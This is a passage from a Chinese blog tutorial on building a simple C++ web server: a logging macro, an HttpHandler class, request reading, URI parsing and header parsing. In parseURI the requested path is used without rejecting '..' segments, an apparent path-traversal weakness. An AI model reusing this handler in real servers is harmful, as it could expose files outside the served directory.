class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="四、日志输出">四、日志输出</h2>
<p>WebServer-1.0版本中实现的输出功能较为简单，只将信息输出到终端的stdout、stderr，没有建立日志文件。</p>
<p>具体实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief   输出信息相关宏定义与函数</span></span><br><span class="line"><span class="comment"> *          使用 `LOG(INFO) &lt;&lt; "msg";` 形式以执行信息输出.</span></span><br><span class="line"><span class="comment"> * @note    注意: 该宏功能尚未完备,多线程下使用LOG宏将会导致输出数据混杂</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INFO    1           <span class="comment">/* 普通输出 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR   2           <span class="comment">/* 错误输出 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG(x)  logmsg(x)   <span class="comment">/* 调用输出函数 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::ostream&amp; <span class="title">logmsg</span><span class="params">(<span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 输出信息时,设置线程互斥</span></span><br><span class="line">    <span class="comment">// 获取线程 TID</span></span><br><span class="line">    <span class="keyword">long</span> tid = syscall(SYS_gettid);</span><br><span class="line">    <span class="keyword">if</span>(flag == ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; tid &lt;&lt; <span class="string">": [ERROR]\t"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">cerr</span>;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(flag == INFO)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; tid &lt;&lt; <span class="string">": [INFO]\t"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        logmsg(ERROR) &lt;&lt; <span class="string">"错误的 LOG 选择"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果有信息需要输出到终端，则按照以下调用方式使用即可，简单方便：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LOG(INFO) &lt;&lt; <span class="string">"my msg"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>输出信息时，会自动将当前子线程的 LWP 号以及信息类型（INFO/ERROR）输出，例如：</p>
<p><img src="/2021/05/WebServer-1/image-20210512133247864.png" alt="image-20210512133247864"></p>
<p>需要注意的是，该输出功能<strong>没有</strong>设置多线程互斥，因此可能会造成输出格式异常，即多个线程同时使用LOG功能，输出的数据在终端上揉成一团，显示的不太雅观。</p>
<h2 id="五、http-请求处理">五、http 请求处理</h2>
<h3 id="1-概述-3">1. 概述</h3>
<p>当 Server 成功与 Client 建立连接后，Client 将会发送数据至 Server，此时 Server 就需要解析数据并进一步将目标数据传送回 Client。其中，http报文的解析和http header的处理便是重点。</p>
<h3 id="2-连接">2. 连接</h3>
<p>当建立起一个新的客户端套接字(<strong>client_fd</strong>)后，目标事件将被放进事件队列中，并等待空闲线程处理。</p>
<p>而这里的事件便是以下函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handlerConnect</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* fd_ptr = (<span class="keyword">int</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> client_fd = *fd_ptr;</span><br><span class="line">    <span class="keyword">delete</span> fd_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(client_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; <span class="string">"client_fd error in handlerConnect"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">HttpHandler <span class="title">handler</span><span class="params">(client_fd)</span></span>;</span><br><span class="line">    handler.RunEventLoop();</span><br><span class="line">    close(client_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以很容易的看到，该函数只做了几件事情：</p>
<ol>
<li>取出 client_fd</li>
<li>初始化 HttpHandler 类实例</li>
<li>调用 <code>HttpHandler::RunEventLoop</code> 函数</li>
<li>最终释放 client_fd</li>
</ol>
<p>这里的 <strong>HttpHandler</strong> 类，就是下文中的重点。</p>
<p>HttpHandler 支持部分 HTTP/1.1 版本的特性——<strong>持续连接</strong>。默认情况下，执行其 RunEventLoop 成员函数时，将循环读取来自客户端的请求，处理并返回对应的响应报文。</p>
<p>HttpHandler 的整体代码结构如下所示，主要是由多个成员函数以及少数几个成员变量组成。RunEventLoop 函数是启动整个处理请求循环的一个开关函数:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief HttpHandler 类处理每一个客户端连接,并根据读入的http报文,动态返回对应的response</span></span><br><span class="line"><span class="comment"> *        其支持的 HTTP 版本为 HTTP/1.1</span></span><br><span class="line"><span class="comment"> * @note  该类只实现了部分异常处理,没有涵盖大部分的异常(不过暂时也够了)</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HttpHandler</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  @brief HttpHandler内部状态 </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="keyword">enum</span> ERROR_TYPE &#123;</span><br><span class="line">        ERR_SUCCESS = <span class="number">0</span>,                <span class="comment">// 无错误</span></span><br><span class="line">        ERR_READ_REQUEST_FAIL,          <span class="comment">// 读取请求数据失败</span></span><br><span class="line">        ERR_NOT_IMPLEMENTED,            <span class="comment">// 不支持一些特定的请求操作,例如 Post</span></span><br><span class="line">        ERR_HTTP_VERSION_NOT_SUPPORTED, <span class="comment">// 不支持当前客户端的http版本</span></span><br><span class="line">        ERR_INTERNAL_SERVER_ERR,        <span class="comment">// 程序内部错误</span></span><br><span class="line">        ERR_CONNECTION_CLOSED,          <span class="comment">// 远程连接已关闭</span></span><br><span class="line">        ERR_BAD_REQUEST,                <span class="comment">// 用户的请求包中存在错误,无法解析  </span></span><br><span class="line">        ERR_SEND_RESPONSE_FAIL          <span class="comment">// 响应包发送失败</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief   显式指定 client fd</span></span><br><span class="line"><span class="comment">     * @param   fd 连接的 fd, 初始值为 -1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">HttpHandler</span><span class="params">(<span class="keyword">int</span> fd = <span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief   释放所有 HttpHandler 所使用的资源</span></span><br><span class="line"><span class="comment">     * @note    注意,不会主动关闭 client_fd</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ~HttpHandler();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief   为当前连接启动事件循环</span></span><br><span class="line"><span class="comment">     * @note    1. 在执行事件循环开始之前,一定要设置 client fd</span></span><br><span class="line"><span class="comment">     *          2. 异常处理不完备</span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RunEventLoop</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只有getFd,没有setFd,因为Fd必须在创造该实例时被设置</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getClientFd</span><span class="params">()</span>           </span>&#123; <span class="keyword">return</span> client_fd_; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> MAXBUF = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> client_fd_;</span><br><span class="line">    <span class="comment">// http 请求包的所有数据</span></span><br><span class="line">    <span class="built_in">string</span> request_;</span><br><span class="line">    <span class="comment">// http 头部</span></span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; headers_; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 请求方式</span></span><br><span class="line">    <span class="built_in">string</span> method_;</span><br><span class="line">    <span class="comment">// 请求路径</span></span><br><span class="line">    <span class="built_in">string</span> path_;</span><br><span class="line">    <span class="comment">// http版本号</span></span><br><span class="line">    <span class="built_in">string</span> http_version_;</span><br><span class="line">    <span class="comment">// 是否是 `持续连接`</span></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> 为了防止bug的产生,对于每一个类中的isKeepAlive_来说,</span></span><br><span class="line">    <span class="comment">//       值只能从 true -&gt; false,而不能再次从 false -&gt; true</span></span><br><span class="line">    <span class="keyword">bool</span> isKeepAlive_;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前解析读入数据的位置</span></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> 该成员变量只在 </span></span><br><span class="line"><span class="comment">     *      readRequest -&gt; parseURI -&gt; parseHttpHeader -&gt; RunEventLoop </span></span><br><span class="line"><span class="comment">     * 内部中使用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">size_t</span> pos_;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 将当前client_fd_对应的连接信息,以 LOG(INFO) 的形式输出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printConnectionStatus</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 从client_fd_中读取数据至 request_中</span></span><br><span class="line"><span class="comment">     * @return 0 表示读取成功, 其他则表示读取过程存在错误</span></span><br><span class="line"><span class="comment">     * @note 内部函数recvn在错误时会产生 errno</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ERROR_TYPE <span class="title">readRequest</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 从0位置处解析 请求方式\URI\HTTP版本等</span></span><br><span class="line"><span class="comment">     * @return 0 表示成功解析, 其他则表示解析过程存在错误</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ERROR_TYPE <span class="title">parseURI</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 从request_中的pos位置开始解析 http header</span></span><br><span class="line"><span class="comment">     * @return 0 表示成功解析, 其他则表示解析过程存在错误</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ERROR_TYPE <span class="title">parseHttpHeader</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief   发送响应报文给客户端</span></span><br><span class="line"><span class="comment">     * @param   responseCode        http 状态码, http报文第二个字段</span></span><br><span class="line"><span class="comment">     * @param   responseMsg         http 报文第三个字段</span></span><br><span class="line"><span class="comment">     * @param   responseBodyType    返回的body类型,即 Content-type</span></span><br><span class="line"><span class="comment">     * @param   responseBody        返回的body内容</span></span><br><span class="line"><span class="comment">     * @return 0 表示成功发送, 其他则表示发送过程存在错误</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ERROR_TYPE <span class="title">sendResponse</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; responseCode, <span class="keyword">const</span> <span class="built_in">string</span>&amp; responseMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> <span class="built_in">string</span>&amp; responseBodyType, <span class="keyword">const</span> <span class="built_in">string</span>&amp; responseBody)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 发送错误信息至客户端</span></span><br><span class="line"><span class="comment">     * @param errCode   错误http状态码</span></span><br><span class="line"><span class="comment">     * @param errMsg    错误信息, http报文第三个字段</span></span><br><span class="line"><span class="comment">     * @return 0 表示成功发送, 其他则表示发送过程存在错误</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ERROR_TYPE <span class="title">handleError</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; errCode, <span class="keyword">const</span> <span class="built_in">string</span>&amp; errMsg)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 将传入的字符串转义成终端可以直接显示的输出</span></span><br><span class="line"><span class="comment">     * @param str 待输出的字符串</span></span><br><span class="line"><span class="comment">     * @return 转义后的字符串</span></span><br><span class="line"><span class="comment">     * @note  是将 '\r' 等无法在终端上显示的字符,转义成 "\r"字符串 输出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">escapeStr</span> <span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; str)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="3-错误类型">3. 错误类型</h3>
<p>HttpHandler 中实现了以下错误类型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*  @brief HttpHandler内部状态 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">enum</span> ERROR_TYPE &#123;</span><br><span class="line">    ERR_SUCCESS = <span class="number">0</span>,                <span class="comment">// 无错误</span></span><br><span class="line">    ERR_READ_REQUEST_FAIL,          <span class="comment">// 读取请求数据失败</span></span><br><span class="line">    ERR_NOT_IMPLEMENTED,            <span class="comment">// 不支持一些特定的请求操作,例如 Post</span></span><br><span class="line">    ERR_HTTP_VERSION_NOT_SUPPORTED, <span class="comment">// 不支持当前客户端的http版本</span></span><br><span class="line">    ERR_INTERNAL_SERVER_ERR,        <span class="comment">// 程序内部错误</span></span><br><span class="line">    ERR_CONNECTION_CLOSED,          <span class="comment">// 远程连接已关闭</span></span><br><span class="line">    ERR_BAD_REQUEST,                <span class="comment">// 用户的请求包中存在错误,无法解析  </span></span><br><span class="line">    ERR_SEND_RESPONSE_FAIL          <span class="comment">// 响应包发送失败</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>除了第一种 <code>ERR_SUCCESS</code> 表示<strong>无错误</strong>以外，其余的错误类型都有对应的错误处理方式，例如<strong>终止连接</strong>或者<strong>向客户端发送一个特定的响应报文</strong>，我们将在下面的内容中提到这些错误处理方式。</p>
<h3 id="4-读取请求数据">4. 读取请求数据</h3>
<p>当远程客户端发送数据至服务器端时，无论传来的是什么数据，首先要做的就是将数据从缓存中读取并保存至自己的缓冲区内。读取时需要明确一点：使用<strong>阻塞方式</strong>读取。因为每个客户端连接都是由单独的线程进行处理的，倘若服务器端没有将所有的请求数据全部读完，那么自然就无法继续执行下去。</p>
<p>同时还需要明确一点的是，调用 readn 函数读取数据时，有可能客户端传来的数据较多，使得读取到的字节数刚好等于传入 readn 的最大缓冲区大小，那么此时就必须保存并继续循环读取，因为这里可能还有一部分数据没有读取完成，仍然需要继续读取。只有当 readn 函数返回的值小于传入的最大缓冲区大小，才能说明来自客户端的数据已经全部读取完成。此时就可以退出<em>读取请求函数</em>。</p>
<p>最后，readn 函数可能会因为出错、远程连接中断等意外情况返回负数，因此这里需要额外写一点错误处理，返回对应原因的错误枚举 ERR_READ_REQUEST_FAIL 或者 ERR_CONNECTION_CLOSED 等等。</p>
<p>综上所述，最终实现的代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HttpHandler::ERROR_TYPE <span class="title">HttpHandler::readRequest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 清除之前的数据</span></span><br><span class="line">    request_.clear();</span><br><span class="line">    pos_ = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buffer[MAXBUF];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 循环阻塞读取 ------------------------------------------</span></span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">ssize_t</span> len = readn(client_fd_, buffer, MAXBUF, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(len &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ERR_READ_REQUEST_FAIL;</span><br><span class="line">        <span class="comment">/** </span></span><br><span class="line"><span class="comment">         * 如果此时没读取到信息并且之前已经读取过信息了,则直接返回.</span></span><br><span class="line"><span class="comment">         * 这里需要注意,有些连接可能会提前连接过来,但是不会马上发送数据.因此需要阻塞等待</span></span><br><span class="line"><span class="comment">         * 这里有个坑点: chromium在每次刷新过后,会额外开一个连接,用来缩短下次发送请求的时间</span></span><br><span class="line"><span class="comment">         * 也就是说这里大概率会出现空连接,即连接到了,但是不会马上发送数据,而是等下一次的请求.</span></span><br><span class="line"><span class="comment">         * </span></span><br><span class="line"><span class="comment">         * 如果读取到的字节数为0,则说明远程连接已经被关闭.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 对于已经读取完所有数据的这种情况</span></span><br><span class="line">            <span class="keyword">if</span>(request_.length() &gt; <span class="number">0</span>)</span><br><span class="line">                <span class="comment">// 直接停止读取</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 如果此时既没读取到数据,之前的 request_也为空,则表示远程连接已经被关闭</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> ERR_CONNECTION_CLOSED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将读取到的数据组装起来</span></span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">request</span><span class="params">(buffer, buffer + len)</span></span>;</span><br><span class="line">        request_ += request;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 由于当前的读取方式为阻塞读取,因此如果读取到的数据已经全部读取完成,则直接返回</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(len) &lt; MAXBUF)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ERR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-解析URI">5. 解析URI</h3>
<p>接下来是 HTTP 请求报文的解析，我们先简单看看 请求报文的格式：</p>
<p><img src="/2021/05/WebServer-1/image-20210507204906032.png" alt="image-20210507204906032"></p>
<p>首先，我们需要从报文中获取第一个以 <code>\r\n</code>结尾的行，并从这行中解析出<strong>请求方法</strong>、<strong>目标URL</strong>以及<strong>HTTP版本</strong>。任何一种因为错误报文格式所导致的解析失败，都是 ERR_BAD_REQUEST 错误。</p>
<p>其次，目前 WebServer-1.0 版本只支持 GET 的请求方法，倘若识别到其他请求方法都会返回 ERR_NOT_IMPLEMENTED 错误。</p>
<p>由于请求 URL 可能是一个文件夹地址，而不是文件。因此如果URL指向的是一个文件夹，那么我们就必须在这个URL地址后添加<code>/index.html</code>字符串，使得请求的目标地址一定是一个文件（即便该文件可能不存在）。</p>
<p>最后，目前的 WebServer-1.0版本只支持 HTTP/1.0 和 HTTP/1.1 版本，因此如果识别到了其他的 HTTP版本，则马上返回 ERR_HTTP_VERSION_NOT_SUPPORTED 错误。</p>
<p>综上所述，最后实现的代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HttpHandler::ERROR_TYPE <span class="title">HttpHandler::parseURI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(request_.empty())   <span class="keyword">return</span> ERR_BAD_REQUEST;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos1, pos2;</span><br><span class="line">    </span><br><span class="line">    pos1 = request_.find(<span class="string">"\r\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(pos1 == <span class="built_in">string</span>::npos)    <span class="keyword">return</span> ERR_BAD_REQUEST;</span><br><span class="line">    <span class="built_in">string</span>&amp;&amp; first_line = request_.substr(<span class="number">0</span>, pos1);</span><br><span class="line">    <span class="comment">// a. 查找get</span></span><br><span class="line">    pos1 = first_line.find(<span class="string">' '</span>);</span><br><span class="line">    <span class="keyword">if</span>(pos1 == <span class="built_in">string</span>::npos)    <span class="keyword">return</span> ERR_BAD_REQUEST;</span><br><span class="line">    method_ = first_line.substr(<span class="number">0</span>, pos1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> output_method = <span class="string">"Method: "</span>;</span><br><span class="line">    <span class="keyword">if</span>(method_ == <span class="string">"GET"</span>)</span><br><span class="line">        output_method += <span class="string">"GET"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> ERR_NOT_IMPLEMENTED;</span><br><span class="line">    LOG(INFO) &lt;&lt; output_method &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// b. 查找目标路径</span></span><br><span class="line">    pos1++;</span><br><span class="line">    pos2 = first_line.find(<span class="string">' '</span>, pos1);</span><br><span class="line">    <span class="keyword">if</span>(pos2 == <span class="built_in">string</span>::npos)    <span class="keyword">return</span> ERR_BAD_REQUEST;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取path时,注意去除 path 中的第一个斜杠</span></span><br><span class="line">    pos1++;</span><br><span class="line">    path_ = first_line.substr(pos1, pos2 - pos1);</span><br><span class="line">    <span class="comment">// 如果 path 为空,则添加一个 . 表示当前文件夹</span></span><br><span class="line">    <span class="keyword">if</span>(path_.length() == <span class="number">0</span>)</span><br><span class="line">        path_ += <span class="string">"."</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断目标路径是否是文件夹</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(stat(path_.c_str(), &amp;st) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果试图打开一个文件夹,则添加 index.html</span></span><br><span class="line">        <span class="keyword">if</span> (S_ISDIR(st.st_mode))</span><br><span class="line">            path_ += <span class="string">"/index.html"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"Path: "</span> &lt;&lt; path_ &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// c. 查看HTTP版本</span></span><br><span class="line">    <span class="comment">// NOTE 这里只支持 HTTP/1.0 和 HTTP/1.1</span></span><br><span class="line">    pos2++;</span><br><span class="line">    http_version_ = first_line.substr(pos2, first_line.length() - pos2);</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"HTTP Version: "</span> &lt;&lt; http_version_ &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测是否支持客户端 http 版本</span></span><br><span class="line">    <span class="keyword">if</span>(http_version_ != <span class="string">"HTTP/1.0"</span> &amp;&amp; http_version_ != <span class="string">"HTTP/1.1"</span>)</span><br><span class="line">        <span class="keyword">return</span> ERR_HTTP_VERSION_NOT_SUPPORTED;</span><br><span class="line">    <span class="comment">// 设置只在 HTTP/1.1时 允许 持续连接</span></span><br><span class="line">    <span class="keyword">if</span>(http_version_ != <span class="string">"HTTP/1.1"</span>)</span><br><span class="line">        isKeepAlive_ = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新pos_</span></span><br><span class="line">    pos_ = first_line.length() + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> ERR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-解析-HTTP-header">6. 解析 HTTP header</h3>
<p>从HTTP报文第二行开始，每个以 <code>\r\n</code>为结尾的一行数据中，都有一个 <code>key: value</code>的键值对（header最后一行除外）。因此我们需要继续遍历请求报文的数据，将每个 HTTP header 存入数据结构中。如果解析报文的时候出现错误，则返回 ERR_BAD_REQUEST 错误。</p>
<p>这里有个点需要注意：HTTP/1.1默认支持<strong>持续连接</strong>，因此 HttpHandler 的成员变量 isKeepAlive_ 默认为 true。但如果客户端中存在这样的 http header <code>Connection: close</code>，则说明当前连接并非<strong>持续性</strong>的，因此处理完当前 http 请求后必须马上断开连接。所以当我们接收到了<code>Connection: close</code>这样的http header时，必须设置 isKeepAlive_  变量为 false。</p>
<p>综上所述，最终实现的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HttpHandler::ERROR_TYPE <span class="title">HttpHandler::parseHttpHeader</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 清除之前的 http header</span></span><br><span class="line">    headers_.clear();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos1, pos2;</span><br><span class="line">    <span class="keyword">for</span>(pos1 = pos_;</span><br><span class="line">        (pos2 = request_.find(<span class="string">"\r\n"</span>, pos1)) != <span class="built_in">string</span>::npos;</span><br><span class="line">        pos1 = pos2 + <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span>&amp;&amp; header = request_.substr(pos1, pos2 - pos1);</span><br><span class="line">        <span class="comment">// 如果遍历到了空头,则表示http header部分结束</span></span><br><span class="line">        <span class="keyword">if</span>(header.size() == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        pos1 = header.find(<span class="string">' '</span>);</span><br><span class="line">        <span class="keyword">if</span>(pos1 == <span class="built_in">string</span>::npos)    <span class="keyword">return</span> ERR_BAD_REQUEST;</span><br><span class="line">        <span class="comment">// key处减去1是为了消除key里的最后一个冒号字符</span></span><br><span class="line">        <span class="built_in">string</span>&amp;&amp; key = header.substr(<span class="number">0</span>, pos1 - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// key 转小写</span></span><br><span class="line">        transform(key.begin(), key.end(), key.begin(), ::<span class="built_in">tolower</span>);</span><br><span class="line">        <span class="comment">// 获取 value</span></span><br><span class="line">        <span class="built_in">string</span>&amp;&amp; value = header.substr(pos1 + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">"HTTP Header: ["</span> &lt;&lt; key &lt;&lt; <span class="string">" : "</span> &lt;&lt; value &lt;&lt; <span class="string">"]"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        headers_[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取header完成后,处理一下 Connection 头</span></span><br><span class="line">    <span class="keyword">auto</span> conHeaderIter = headers_.find(<span class="string">"connection"</span>);</span><br><span class="line">    <span class="keyword">if</span>(conHeaderIter != headers_.end())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> value = conHeaderIter-&gt;second;</span><br><span class="line">        transform(value.begin(), value.end(), value.begin(), ::<span class="built_in">tolower</span>);</span><br><span class="line">        <span class="keyword">if</span>(value != <span class="string">"keep-alive"</span>)</span><br><span class="line">            isKeepAlive_ = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断处理空 header 条目的 \r\n</span></span><br><span class="line">    <span class="keyword">if</span>((request_.size() &lt; pos1 + <span class="number">2</span>) || (request_.substr(pos1, <span class="number">2</span>) != <span class="string">"\r\n"</span>))</span><br><span class="line">        <span class="keyword">return</span> ERR_BAD_REQUEST;</span><br><span class="line"></span><br><span class="line">    pos_ = pos1 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> ERR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-发送响应报文">7. 发送响应报文</h3>
<p>http响应报文格式如下所示：</p>
<p><img src="/2021/05/WebServer-1/image-20210507205312687.png" alt="image-20210507205312687"></p>
<p>照着这个报文格式，照葫芦画瓢构建一个报文并将其发送至客户端即可。</p>
